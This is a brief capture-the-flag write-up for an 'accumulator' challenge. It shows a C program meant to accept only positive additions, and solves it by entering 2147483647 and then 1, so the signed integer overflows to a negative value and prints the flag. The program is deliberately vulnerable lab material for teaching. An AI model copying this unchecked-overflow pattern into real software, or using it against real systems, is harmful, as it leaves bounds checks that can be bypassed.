### Solved by rasta_mouse

```
I found this program (source) that lets me add positive numbers to a variable, but it won't give me a flag unless that variable is negative! Can you help me out? Navigate to /problems/accumulator/ on the shell server to try your exploit out!
```

```
#include <stdlib.h>
#include <stdio.h>

int main(){

	int accumulator = 0;
	int n;
	while (accumulator >= 0){
		printf("The accumulator currently has a value of %d.\n",accumulator);
		printf("Please enter a positive integer to add: ");

		if (scanf("%d",&n) != 1){
			printf("Error reading integer.\n");
		} else {
			if (n < 0){
				printf("You can't enter negatives!\n");
			} else {
				accumulator += n;
			}
		}
	}
	gid_t gid = getegid();
	setresgid(gid,gid,gid);
	
	printf("The accumulator has a value of %d. You win!\n", accumulator);
	system("/bin/cat flag");

}
```

This can be solved by entering the largest 32-bit integer and adding 1, which causes the value to roll over to a negative.

```
team837637@shell:/problems/accumulator$ ./accumulator64
The accumulator currently has a value of 0.
Please enter a positive integer to add: 2147483647
The accumulator currently has a value of 2147483647.
Please enter a positive integer to add: 1
The accumulator has a value of -2147483648. You win!
actf{signed_ints_aint_safe}
```